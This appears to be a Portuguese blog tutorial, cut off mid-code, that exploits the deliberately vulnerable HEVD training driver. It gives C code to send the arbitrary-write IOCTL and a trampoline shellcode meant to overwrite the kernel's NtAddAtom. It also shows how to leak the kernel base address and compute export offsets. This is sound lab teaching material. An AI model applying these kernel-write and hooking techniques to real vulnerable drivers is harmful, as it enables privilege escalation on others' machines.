+<p>Caso você queira identificar ou confirmar qual é o nome do dispositivo criado pelo driver, uma forma prática é utilizar o <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/winobj"><strong>WinObj</strong></a>, da Sysinternals. Ele permite visualizar todos os objetos do namespace do Windows, incluindo drivers carregados e seus respectivos device names, como mostrado na imagem abaixo:</p>
+<p>![[Pasted image 20260422175306.png]]</p>
+<p>Se a chamada para <code>CreateFileW</code> retornar um handle válido, significa que conseguimos estabelecer comunicação com o driver, e a partir desse ponto, podemos enviar <strong>IOCTLs</strong> e explorar a vulnerabilidade.</p>
+<p>O código para testar a conexão fica assim:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;windows.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;winioctl.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;iostream></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;memory></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> "executar_ioctl.h"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">int</span><span style="color:#B392F0"> main</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"===========================================</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"    HackSysExtremeVulnerableDriver - POC   </span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"===========================================</span><span style="color:#79B8FF">\n\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Inicializando conexao com o driver...</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    MemoryTester classe_tester;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">classe_tester.</span><span style="color:#B392F0">Initialize</span><span style="color:#E1E4E8">()) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[!] Falha ao abrir dispositivo: </span><span style="color:#79B8FF">%d\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">GetLastError</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[!] Certifique-se de que o driver esta carregado e o dispositivo esta acessivel</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">    system</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"pause"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Após executar esse código, obtemos a confirmação de que o handle do dispositivo foi aberto, o que nos permite prosseguir para a fase mais interessante: <strong>enviar o IOCTL vulnerável</strong>.</p>
+<p>![[Pasted image 20260422175329.png]]</p>
+<hr>
+<h3 id="enviando-o-ioctl">Enviando o IOCTL<a aria-hidden="true" tabindex="-1" href="#enviando-o-ioctl"><span class="icon icon-link"></span></a></h3>
+<p>O <strong>IOCTL</strong> que ativa a primitiva de escrita arbitrária no HEVD é o <code>0x22200B</code>, então:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> HEVD_IOCTL_ARBITRARY_WRITE</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">22200B</span></span></code></pre>
+<p>Como vimos anteriormente na análise reversa, o driver espera receber uma estrutura contendo dois ponteiros:</p>
+<ul>
+<li>
+<p><strong>What</strong> → endereço de onde será lido o valor</p>
+</li>
+<li>
+<p><strong>Where</strong> → endereço para onde o valor será escrito</p>
+</li>
+</ul>
+<p>Podemos representá-la em C/C++ como:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">typedef</span><span style="color:#F97583"> struct</span><span style="color:#E1E4E8"> _WRITE_WHAT_WHERE {</span></span>
+<span class="line"><span style="color:#E1E4E8">    PVOID What;</span></span>
+<span class="line"><span style="color:#E1E4E8">    PVOID Where;</span></span>
+<span class="line"><span style="color:#E1E4E8">} WRITE_WHAT_WHERE, </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">PWRITE_WHAT_WHERE;</span></span></code></pre>
+<p>Com isso, adicionamos à classe <code>MemoryTester</code> um método responsável por disparar o IOCTL vulnerável:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">ArbitraryWrite</span><span style="color:#E1E4E8">(PVOID </span><span style="color:#FFAB70">What</span><span style="color:#E1E4E8">, PVOID </span><span style="color:#FFAB70">Where</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">    WRITE_WHAT_WHERE Struct </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> { </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8"> };</span></span>
+<span class="line"><span style="color:#E1E4E8">    Struct.What  </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> What;</span></span>
+<span class="line"><span style="color:#E1E4E8">    Struct.Where </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> Where;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">[*] Chamando IOCTL_ARBITRARY_WRITE</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Codigo IOCTL: 0x</span><span style="color:#79B8FF">%X\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, HEVD_IOCTL_ARBITRARY_WRITE);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Destino (Where): 0x</span><span style="color:#79B8FF">%p\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, Where);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">    BOOL result </span><span style="color:#F97583">=</span><span style="color:#B392F0"> DeviceIoControl</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8">        hDevice,</span></span>
+<span class="line"><span style="color:#E1E4E8">        HEVD_IOCTL_ARBITRARY_WRITE,</span></span>
+<span class="line"><span style="color:#F97583">        &#x26;</span><span style="color:#E1E4E8">Struct,</span></span>
+<span class="line"><span style="color:#F97583">        sizeof</span><span style="color:#E1E4E8">(WRITE_WHAT_WHERE),</span></span>
+<span class="line"><span style="color:#79B8FF">        NULL</span><span style="color:#E1E4E8">,</span><span style="color:#6A737D">   // No output buffer</span></span>
+<span class="line"><span style="color:#79B8FF">        0</span><span style="color:#E1E4E8">,</span><span style="color:#6A737D">      // No output buffer size</span></span>
+<span class="line"><span style="color:#79B8FF">        NULL</span><span style="color:#E1E4E8">,</span><span style="color:#6A737D">   // No bytes returned</span></span>
+<span class="line"><span style="color:#79B8FF">        NULL</span><span style="color:#6A737D">    // No overlapped</span></span>
+<span class="line"><span style="color:#E1E4E8">    );</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (result) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Chamada IOCTL realizada com sucesso!</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD error </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetLastError</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Chamada IOCTL falhou com erro: </span><span style="color:#79B8FF">%d</span><span style="color:#9ECBFF"> (0x</span><span style="color:#79B8FF">%X</span><span style="color:#9ECBFF">)</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, error, error);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (error </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> ERROR_INVALID_FUNCTION) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Codigo IOCTL invalido: 0x</span><span style="color:#79B8FF">%X\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, HEVD_IOCTL_ARBITRARY_WRITE);</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Agora que já temos a função <code>ArbitraryWrite</code> implementada, o próximo passo é chamá-la a partir da função <code>main</code>. Para isso, precisamos fornecer dois argumentos:</p>
+<ul>
+<li>
+<p><strong>What</strong> → ponteiro para o valor que queremos escrever</p>
+</li>
+<li>
+<p><strong>Where</strong> → endereço de destino onde o valor será gravado</p>
+</li>
+</ul>
+<p>Para testar se a primitiva realmente funciona, podemos começar criando uma área de memória totalmente controlada em modo usuário, isso permite verificar a escrita sem arriscar travamentos</p>
+<p>A alocação pode ser feita de forma simples sem nenhum problema:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">PULONG_PTR targetMemory </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (PULONG_PTR)</span><span style="color:#B392F0">VirtualAlloc</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#79B8FF">    NULL</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#F97583">    sizeof</span><span style="color:#E1E4E8">(ULONG_PTR),</span></span>
+<span class="line"><span style="color:#E1E4E8">    MEM_COMMIT </span><span style="color:#F97583">|</span><span style="color:#E1E4E8"> MEM_RESERVE,</span></span>
+<span class="line"><span style="color:#E1E4E8">    PAGE_EXECUTE_READWRITE</span></span>
+<span class="line"><span style="color:#E1E4E8">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Memoria de destino alocada em: 0x</span><span style="color:#79B8FF">%p\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, targetMemory);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">ULONG_PTR valueToWrite </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 176</span><span style="color:#E1E4E8">;</span></span></code></pre>
+<p>Com essa estrutura montada, podemos chamar o método <code>ArbitraryWrite</code> passando o endereço do valor a ser escrito e o endereço da memória alvo:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> (classe_tester.</span><span style="color:#B392F0">ArbitraryWrite</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#FFAB70">valueToWrite</span><span style="color:#E1E4E8">, targetMemory)) {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">[*] Verificando operacao de escrita...</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Valor final: </span><span style="color:#79B8FF">%llu</span><span style="color:#9ECBFF"> (0x</span><span style="color:#79B8FF">%llX</span><span style="color:#9ECBFF">)</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">targetMemory, </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">targetMemory);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">targetMemory </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> valueToWrite) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] SUCESSO! Valor 176 escrito com sucesso!</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Vulnerabilidade de escrita arbitraria confirmada!</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] FALHA! Valor nao foi escrito corretamente</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Esperado: </span><span style="color:#79B8FF">%llu</span><span style="color:#9ECBFF">, Obtido: </span><span style="color:#79B8FF">%llu\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, valueToWrite, </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">targetMemory);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Funcao ArbitraryWrite falhou</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Ao executar o código, obtemos o seguinte resultado, demonstrando claramente que o driver aceitou o IOCTL e realizou a escrita arbitrária com sucesso:</p>
+<p>![[Pasted image 20260422175412.png]]</p>
+<hr>
+<h2 id="elevando-a-dificuldade">Elevando a dificuldade<a aria-hidden="true" tabindex="-1" href="#elevando-a-dificuldade"><span class="icon icon-link"></span></a></h2>
+<p>Bom, agora que descobrimos que é realmente fácil abusar dessa função, como poderíamos chamar uma função arbitrária, algo como <strong>DbgPrint</strong> por exemplo? Pode parecer besteira, mas vai ser bem mais desafiador do que parece conseguir fazer isso.</p>
+<p>Se você analisar o driver, vai perceber que não existe um <strong>IOCTL</strong> específico para executar código arbitrário ou chamar funções diretamente. Então, precisamos forçar essa chamada de alguma forma. Mas como podemos fazer isso?</p>
+<p>Uma maneira de conseguir isso é calculando o endereço base do kernel e somando o offset até uma função Nt, como por exemplo NtAddAtom. Nesse endereço, vamos sobrescrever os primeiros bytes da função com um gadget que nos permitirá redirecionar o fluxo de execução para onde quisermos.</p>
+<p>O gadget que vamos utilizar é bem simples:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">unsigned</span><span style="color:#F97583"> char</span><span style="color:#E1E4E8"> shellcode</span><span style="color:#F97583">[]</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">    0x</span><span style="color:#79B8FF">48</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">B8</span><span style="color:#E1E4E8">,</span><span style="color:#6A737D">               // mov rax, &#x3C;endereço></span></span>
+<span class="line"><span style="color:#79B8FF">    0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#6A737D">   // endereço de 64 bits (será preenchido)</span></span>
+<span class="line"><span style="color:#F97583">    0x</span><span style="color:#79B8FF">FF</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">E0</span><span style="color:#E1E4E8">,</span><span style="color:#6A737D">               // jmp rax</span></span>
+<span class="line"><span style="color:#F97583">    0x</span><span style="color:#79B8FF">90</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">90</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">90</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">90</span><span style="color:#6A737D">    // NOP padding para 16 bytes</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span></code></pre>
+<p>Esse pequeno trecho de código faz o seguinte:</p>
+<ul>
+<li>
+<p><strong>mov rax, &#x3C;endereço></strong> → carrega um endereço de 64 bits no registrador RAX</p>
+</li>
+<li>
+<p><strong>jmp rax</strong> → salta para o endereço contido em RAX</p>
+</li>
+</ul>
+<p>Em outras palavras, estamos criando um trampolim. Quando alguém chamar a função NtAddAtom (que agora está corrompida), em vez de executar o código original, o processador vai executar nosso gadget, que imediatamente desviará a execução para o endereço que especificarmos.</p>
+<p>Mas temos alguns problemas aqui. Se tentarmos escrever diretamente nesse endereço de memória, vamos obter uma tela azul bem bonita. Isso ocorre porque esse endereço está em uma região protegida contra escrita.</p>
+<p>Antes de resolver esse problema, precisamos primeiro descobrir onde o kernel está carregado na memória. Para isso, adicionamos à nossa classe <code>MemoryTester</code> um método chamado <code>GetBaseAddr</code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;psapi.h></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">LPVOID </span><span style="color:#B392F0">GetBaseAddr</span><span style="color:#E1E4E8">(LPCWSTR </span><span style="color:#FFAB70">drvname</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#E1E4E8">    LPVOID </span><span style="color:#FFAB70">drivers</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">1024</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD cbNeeded;</span></span>
+<span class="line"><span style="color:#F97583">    int</span><span style="color:#E1E4E8"> nDrivers, i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">EnumDeviceDrivers</span><span style="color:#E1E4E8">(drivers, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(drivers), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">cbNeeded) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#E1E4E8"> cbNeeded </span><span style="color:#F97583">&#x3C;</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(drivers))</span></span>
+<span class="line"><span style="color:#E1E4E8">    {</span></span>
+<span class="line"><span style="color:#E1E4E8">        WCHAR </span><span style="color:#FFAB70">szDrivers</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">1024</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#E1E4E8">        nDrivers </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> cbNeeded </span><span style="color:#F97583">/</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">drivers</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> (i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> nDrivers; i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">        {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">GetDeviceDriverBaseName</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">drivers</span><span style="color:#E1E4E8">[i], szDrivers,</span></span>
+<span class="line"><span style="color:#F97583">                sizeof</span><span style="color:#E1E4E8">(szDrivers) </span><span style="color:#F97583">/</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">szDrivers</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">])))</span></span>
+<span class="line"><span style="color:#E1E4E8">            {</span></span>
+<span class="line"><span style="color:#F97583">                if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">wcscmp</span><span style="color:#E1E4E8">(szDrivers, drvname) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">                {</span></span>
+<span class="line"><span style="color:#F97583">                    return</span><span style="color:#FFAB70"> drivers</span><span style="color:#E1E4E8">[i];</span></span>
+<span class="line"><span style="color:#E1E4E8">                }</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Essa função utiliza <code>EnumDeviceDrivers</code> para enumerar todos os drivers carregados no sistema e armazená-los no array drivers. Depois disso, ela percorre cada entrada desse array usando <code>GetDeviceDriverBaseName</code> para obter o nome de cada driver.</p>
+<p>Quando encontra o driver que estamos procurando (no nosso caso, ntoskrnl.exe), ela simplesmente retorna o endereço base correspondente. Esse é justamente o endereço onde o kernel do Windows está carregado na memória.</p>
+<p>Na função main, chamamos esse método da seguinte forma:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Chamando EnumDeviceDrivers para encontrar NT base</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">LPVOID nt_base </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> classe_tester.</span><span style="color:#B392F0">GetBaseAddr</span><span style="color:#E1E4E8">(L</span><span style="color:#9ECBFF">"ntoskrnl.exe"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] NT base: </span><span style="color:#79B8FF">%p\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, nt_base);</span></span></code></pre>
+<p>Com esse endereço em mãos, temos a base do kernel. A partir dele, podemos calcular o offset até qualquer função exportada, como <code>NtAddAtom</code>.</p>
+<p>Agora precisamos descobrir onde exatamente ficam as funções <code>NtAddAtom</code> e <code>DbgPrint</code> dentro dele. Para isso, vamos usar um truque bem interessante: carregar uma cópia do <code>ntoskrnl.exe</code> em modo usuário.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">HMODULE user_copy </span><span style="color:#F97583">=</span><span style="color:#B392F0"> LoadLibraryExW</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8">    L</span><span style="color:#9ECBFF">"C:</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">Windows</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">System32</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">ntoskrnl.exe"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">    NULL</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">    DONT_RESOLVE_DLL_REFERENCES);</span></span>
+<span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">user_copy) {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Falha ao carregar a copia do kernel</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Aqui estamos usando <code>LoadLibraryExW</code> com a flag <code>DONT_RESOLVE_DLL_REFERENCES</code>, que carrega o arquivo do kernel como se fosse uma DLL comum, mas sem resolver suas dependências.</p>
+<p>A grande sacada aqui é que, embora estejamos carregando o arquivo em modo usuário, a estrutura interna dele é idêntica à versão carregada no kernel. Isso significa que os offsets relativos das funções exportadas são os mesmos.</p>
+<p>Com essa cópia em mãos, podemos calcular os offsets:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">ULONGLONG offset </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> classe_tester.</span><span style="color:#B392F0">GetKernelExportOffset</span><span style="color:#E1E4E8">(user_copy, </span><span style="color:#9ECBFF">"NtAddAtom"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">ULONGLONG ntaddatom_kernel </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (ULONGLONG)nt_base </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> offset;</span></span>
+<span class="line"><span style="color:#B392F0">printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Endereco do Kernel NtAddAtom: 0x</span><span style="color:#79B8FF">%llx\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, ntaddatom_kernel);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">ULONGLONG dbgprint_offset </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> classe_tester.</span><span style="color:#B392F0">GetKernelExportOffset</span><span style="color:#E1E4E8">(user_copy, </span><span style="color:#9ECBFF">"DbgPrint"</span><span style="color:#E1E4E8">);</span></span>
